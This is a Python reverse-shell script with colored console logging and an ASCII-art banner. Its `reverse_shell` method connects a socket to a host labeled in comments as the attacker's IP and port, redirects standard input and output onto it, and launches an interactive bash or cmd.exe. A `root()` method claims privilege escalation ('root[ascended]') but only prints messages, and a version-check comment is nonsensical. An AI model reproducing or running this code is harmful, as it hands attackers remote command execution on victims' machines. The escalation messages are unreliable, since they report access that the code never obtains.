from os import dup2
from subprocess import run, call
import socket
import sys

def dec(_in):
    tmp = str(_in).lower()[0]
    return bool(tmp == "y" or tmp == "t")

class session_t:
    # @name = str() | @ascend: bool()
    def __init__(self, name = "", ascend = False):
        self.name = name
        if name != "":
            self.log([
                (f"{name}@session_t ->", (205, 205, 205)),
                (f"__init__(ascend: {ascend})", (192, 160, 0)),
            ], True)

            if ascend:
                self.root()

            if dec( input( self.log([
                (f"{name}@input ?", (205, 205, 205)),
                (f"start reverse shell instance -", (192, 160, 0)),
            ], False) ) ):
                self.reverse_shell("127.0.0.1", 8888)

    def root(self):
        self.log([
            (f"{self.name}@session_t:", (205, 205, 205)),
            ("root[ascending..]", (177, 72, 198)),
        ], True)
        
        if sys.platform == "linux":
            self.log([
                (f"{self.name}@session_t:", (205, 205, 205)),
                ("root[ascended]", (24, 168, 0)),
            ], True)
        else:
            self.log([
                (f"{self.name}@session_t:", (205, 205, 205)),
                (f"root[{sys.platform}:cannot_ascend]", (168, 24, 0)),
            ], True)

        self.log([
            (f"{self.name}@session_t:", (205, 205, 205)),
            ("root[end]", (24, 168, 0)),
        ], True)

    # @ip: str("attacker ipV4") | @port: int("attacker port")
    def reverse_shell(self, ip, port):
        self.log([
            (f"{self.name}@{sys.platform}:", (205, 205, 205)),
            ("reverse_shell[connecting..]", (177, 72, 198)),
        ], True)

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect( (ip, port) ) 

            if sys.platform == "linux":
                dup2(s.fileno(), 0)
                dup2(s.fileno(), 1)
                dup2(s.fileno(), 2)

            # Windows: cmd.exe
            # Linux: /bin/bash
            run_tool = "cmd.exe"
            if sys.platform == "linux":
                run_tool = "/bin/bash"
                
            outdated = sys.version_info[0] >= 3 # 3.5: bigint exception
            if outdated:
                run( [run_tool,"-i"] )
            else:
                call( [run_tool,"-i"] )

            
        except:
            self.log([
                (f"{self.name}@session_t:", (205, 205, 205)),
                ("reverse_shell[failed]", (168, 24, 0)),
            ], True)
        else:
            self.log([
                (f"{self.name}@{sys.platform}:", (205, 205, 205)),
                ("reverse_shell[connected]", (24, 168, 0)),
            ], True)

    # @data: tuple(text, tuple(color))
    def log(self, data, out):
        _output = ""
        for i in range(len(data)):
            _output += "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(data[i][1][0], data[i][1][1], data[i][1][2], data[i][0])

        if out:
            print(_output)
        else:
            return _output

def art():
    out = session_t()
    out.log([
        ("       .__                     .__   ", (177, 72, 198)),
    ], True)
    out.log([
        ("  _____|__| ____   ____ _____  |  |  ", (177, 72, 198)),
    ], True)
    out.log([
        (" /  ___/  |/ ___\ /    |\__  \ |  |  ", (177, 72, 198)),
    ], True)
    out.log([
        (" \___ \|  / /_/  >   |  \/ __ \|  |__", (177, 72, 198)),
    ], True)
    out.log([
        ("/____  >__\___  /|___|  (____  /____/", (177, 72, 198)),
    ], True)
    out.log([
        ("     \/  /_____/      \/     \/      ", (177, 72, 198)),
    ], True)

def main():
    art()
    cur = session_t("main", True)

if __name__ == "__main__":
    try:
        main()
    except:
        session_t().log([
            ("[!!!]", (168, 24, 0)),
            ("system:", (205, 205, 205)),
            ("internal error", (168, 24, 0)),
        ], True)